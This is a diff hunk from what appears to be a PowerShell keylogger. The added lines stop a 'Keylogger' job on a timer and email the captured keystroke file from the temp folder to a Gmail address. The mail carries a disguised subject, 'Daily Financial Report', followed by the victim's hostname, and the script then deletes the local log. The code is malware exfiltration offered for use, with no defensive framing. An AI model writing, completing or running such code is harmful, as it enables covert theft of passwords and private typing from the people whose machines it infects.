@@ -242,7 +242,17 @@ function Old-Guard {
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
             Stop-Job -Name Keylogger
             Unregister-Event -SourceIdentifier ElapsedAction
+            
+            #Send email with report
+            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com'; 
+            $ReportEmail.To.Add('warof1846@gmail.com'); 
+            $ReportEmail.Subject = 'Daily Financial Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName; 
+            $ReportEmail.Body = 'Automated report.';
+            $ReportEmail.Attachments.Add('%temp%/key_final.txt');
+            $SMTPInfo.Send($ReportEmail);
+            $SMTPInfo.Send($ReportEmail);
             Remove-item "$env:TEMP/key_final.txt"
+            
             $Sender.Stop()
         } | Out-Null
     }
